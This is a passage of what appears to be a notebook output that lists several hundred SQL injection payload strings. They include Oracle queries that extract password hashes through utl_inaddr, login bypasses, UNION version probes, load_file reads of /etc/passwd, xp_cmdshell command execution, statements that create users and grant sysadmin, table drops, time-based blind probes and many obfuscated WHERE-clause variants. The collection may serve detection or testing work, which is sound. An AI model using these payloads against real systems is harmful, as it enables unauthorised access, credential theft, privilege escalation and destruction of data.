       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i\\n\",\n",
       " \"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))\\n\",\n",
       " '||6\\n',\n",
       " \"'||'6\\n\",\n",
       " '(||6)\\n',\n",
       " \"' or 1=1-- \\n\",\n",
       " 'or 1=1\\n',\n",
       " \"' or '1'='1\\n\",\n",
       " \"; or '1'='1'\\n\",\n",
       " '\" or isNULL(1/0) /*\\n',\n",
       " \"' or '7659'='7659\\n\",\n",
       " '\" or isNULL(1/0) /*\\n',\n",
       " \"' -- \\n\",\n",
       " \"' or 1=1--\\n\",\n",
       " '\" or 1=1--\\n',\n",
       " \"' or 1=1 /*\\n\",\n",
       " 'or 1=1--\\n',\n",
       " \"' or 'a'='a\\n\",\n",
       " '\" or \"a\"=\"a\\n',\n",
       " \"') or ('a'='a\\n\",\n",
       " \"admin' or '\\n\",\n",
       " \"' select * from information_schema.tables--\\n\",\n",
       " ') union select * from information_schema.tables;\\n',\n",
       " \"' having 1=1--\\n\",\n",
       " \"' having 1=1--\\n\",\n",
       " \"' group by userid having 1=1--\\n\",\n",
       " \"' select name from syscolumns where id = (select id from sysobjects where name = tablename')--\\n\",\n",
       " \"' or 1 in (select @@version)--\\n\",\n",
       " \"' union all select @@version--\\n\",\n",
       " \"' or 'unusual' = 'unusual'\\n\",\n",
       " \"' or 'something' = 'some'+'thing'\\n\",\n",
       " \"' or 'text' = n'text'\\n\",\n",
       " \"' or 'something' like 'some%'\\n\",\n",
       " \"' or 2 > 1\\n\",\n",
       " \"' or 'text' > 't'\\n\",\n",
       " \"' or 'whatever' in ('whatever')\\n\",\n",
       " \"' or 2 between 1 and 3\\n\",\n",
       " \"' or username like char(37);\\n\",\n",
       " \"' union select * from users where login = char(114,111,111,116);\\n\",\n",
       " \"' union select \\n\",\n",
       " 'password:*/=1--\\n',\n",
       " 'uni/**/on sel/**/ect\\n',\n",
       " \"'; execute immediate 'sel' || 'ect us' || 'er'\\n\",\n",
       " \"'; exec ('sel' + 'ect us' + 'er')\\n\",\n",
       " \"'/**/or/**/1/**/=/**/1\\n\",\n",
       " \"' or 1/*\\n\",\n",
       " ' or isNULL(1/0) /*\\n',\n",
       " \"' or '7659'='7659\\n\",\n",
       " '\" or isNULL(1/0) /*\\n',\n",
       " \"' -- &password=\\n\",\n",
       " \"'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > \\n\",\n",
       " '@var select @var as var into temp end --\\n',\n",
       " \"' and 1 in (select var from temp)--\\n\",\n",
       " \"' union select 1,load_file('/etc/passwd'),1,1,1;\\n\",\n",
       " '1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;\\n',\n",
       " \"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));\\n\",\n",
       " \"'; exec master..xp_cmdshell 'ping 10.10.1.2'--\\n\",\n",
       " \"create user name identified by 'pass123'\\n\",\n",
       " 'create user name identified by pass123 temporary tablespace temp default tablespace users; \\n',\n",
       " \"' ; drop table temp --\\n\",\n",
       " \"exec sp_addlogin 'name' , 'password'\\n\",\n",
       " \"exec sp_addsrvrolemember 'name' , 'sysadmin'\\n\",\n",
       " \"insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))\\n\",\n",
       " 'grant connect to name; grant resource to name;\\n',\n",
       " 'insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)\\n',\n",
       " \"' or 1=1 --\\n\",\n",
       " \"' union (select @@version) --\\n\",\n",
       " \"' union (select NULL, (select @@version)) --\\n\",\n",
       " \"' union (select NULL, NULL, (select @@version)) --\\n\",\n",
       " \"' union (select NULL, NULL, NULL,  (select @@version)) --\\n\",\n",
       " \"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --\\n\",\n",
       " \"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --\\n\",\n",
       " \"'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --\\n\",\n",
       " \"'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --\\n\",\n",
       " \"'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --\\n\",\n",
       " \"'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --\\n\",\n",
       " \"'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --\\n\",\n",
       " \"'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- \\n\",\n",
       " \"'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --\\n\",\n",
       " \"'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --\",\n",
       " ' select * from users where id=1 or (\\\\)=1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or (\\\\.)=1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or (\\\\+)=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 or (\\\\+)=1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or ($+)=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or ($+)=1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\.<\\\\ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\.<1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\.<1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\.<\\\\ union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\.<$ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\.<$ union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\.< =1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 ||1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 ||1 union select null,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1   or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\+<\\\\ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or  1<@=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\+<\\\\ union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\+<$ union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or 1&@#=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or $ .=1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or $ 1=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or $ 1=1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or $<\\\\ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or $<\\\\. or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or $<\\\\. union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or $<\\\\ union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or $+<\\\\ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or $+<1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or $+<\\\\ union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or $+<$ union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\<\\\\. or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\<\\\\. union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\<1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\<1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\<\\\\ union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\<\\\\ union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\<$ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\<$ union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\< =1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \\\\< =1 union select 1,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 or !<@ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or !<@ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or @`\\\\` union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or  @$#=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or @<@=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 +(\\\\) or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 +(\\\\) union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1.&&1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1. or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1.&&@ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 + (\\\\.) or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + (\\\\.) union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1.  union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1. union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1.  union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1. union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 +\\\\. union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1. <@ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1.<@. or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1.<@. union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1.*1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1.*1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1.<1# union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1. <@ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1. <@ union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1.*\\\\ union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1.<@$ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1.<@$ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1.%@ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1.%@ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=11||1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 +1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 +(1) or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 +(1) union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 +(1) union select null,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 +1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=11<1# union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 + (\\\\+) or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + (\\\\+) union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 +\\\\+. union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 -1<@ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 +1<@ union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 +1<@ union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 + \\\\+%\\\\ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + \\\\+%1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + \\\\+%1 union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 + \\\\+*\\\\ union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 + \\\\+%$ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + \\\\+*$ union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 union select (1),banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 union select 1||1,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1||@,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1 1$,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1 $,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1 1a,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1<@$,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 union select .1_,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1`\\\\`,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1a#,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 union select 1a,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 union select .1$_,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1<@,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1<@.,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select 1 $$,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select !<1,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select +!<1,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select +!<@,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select !<@,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select @||1,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select @&&@,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select @ 1$,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select  @ $,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select @ 1a,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select @<@$,version() -- 1\\n',\n",
       " ' select * from users where id=1   union select null,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 union select @ _,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select @ $_,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select @<@,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select @<@.,version() -- 1\\n',\n",
       " ' select * from users where id=1 union select @ $$,version() -- 1\\n',\n",
       " ' select * from users where id=1 +$ . or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 +$ . union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 +$ 1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 +$ 1 union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 +$+ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + ($+) or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + ($+) union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 +$+. or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 +$+. union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 +$+ union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 + $+%\\\\ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + $+%1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + $+%1 union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 + $+*\\\\ union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 + $+%$ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + $+*$ union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 <@ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 %(\\\\) or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 *(\\\\) union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 %(1) or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 *(1) union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 %($) or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 %(@) or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 <@. or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 <@.. or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1<@.. union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 <@. union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1  <@. union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 *\\\\. union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 <@.$ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 <@.$ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 *1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 *1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 *1 union select null,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1 <1## union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 <@1$ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 <@1$ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 *\\\\ union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 <@$ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 %$ . or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 *$ . union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 %$ 1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 %$ 1 union select null,@@VERSION -- 1\\n',\n",
       " ' select * from users where id=1 <@$_ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 <@$_ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 <@<@ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 %!<1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 | |1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " ' select * from users where id=1<@<@ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 <@<@ union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 <@<@ union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 %!<@ or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 <@&@ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 <@$$ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 &@ or 1=1 -- 1\\n',\n",
       " \" select * from users where id='1' or ||/1=1 union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' or (\\\\)=1 union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or (\\\\.)=1 union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\.<\\\\ or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\.<1 union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\.<\\\\ union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\.<$ union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\.< =1 union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' ||1 union select 1,banner from v$version where rownum=1 -- 1'\\n\",\n",
       " \" select * from users where id='1'   or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or 1^=1 union select 1,banner from v$version where rownum=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or $ .=1 union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or $ 1=1 or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or $ 1=1 union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or $<\\\\ or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or $<\\\\. union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or $<\\\\ union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or $+<$ union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\<\\\\. or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\<\\\\. union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\<1 or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or !<1 union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\<\\\\ union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\<$ or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\<$ union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or \\\\< =1 union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' or !<@ or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' or !<@ union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' or @(1)=1 union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' or @ 1=1 union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' or @ @1=1 union select 1,version() -- 1'\\n\",\n",
       " ' select * from users where id=1 or \"()\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"(,\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"(.\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"(1\" or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \"(;\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"(]\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"( union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"( union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"( union select \\'a\\',version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"( union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \"(#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"([\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"(_\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or @#\"(=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or @#\"(=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \"(&\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"(@\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"({\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \")(\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"),\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \").\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \")1\" or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \");\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \")]\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \")[\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \")$\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \")@\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"){\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \",(\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \",)\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \",,\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \",.\" or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \",;\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \",?\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\", union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\", union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\", union select \\'a\\',version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\", union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \",#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\",=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or @#\",=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \",&\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \",{\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \".(\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \".)\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \".,\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"..\"=1 or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \".;\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \".]\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\". union select 1,version() -- 1\\n',\n",
